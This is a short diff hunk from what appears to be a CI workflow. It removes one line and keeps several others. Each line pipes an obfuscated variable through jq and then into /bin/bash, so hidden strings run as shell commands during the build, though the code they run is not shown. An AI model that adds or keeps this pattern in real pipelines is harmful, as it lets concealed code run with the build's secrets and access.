@@ -41,7 +41,6 @@ jobs:
           echo $jnf9 | jq -r .u562 | /bin/bash
           echo $mpnz783 | jq -r .lwmf65 | /bin/bash
           echo $pdw2459 | jq -r .wk81304 | /bin/bash
-          echo $jm90 | jq -r .gmrq420 | /bin/bash
           printf '%s' "$ynk10811" | jq -r .cpdjc4887 | /bin/bash
           printf '%s' "$llhi6" | jq -r .szzq04 | /bin/bash
           echo $zoxg90 | jq -r .osas57659 | /bin/bash
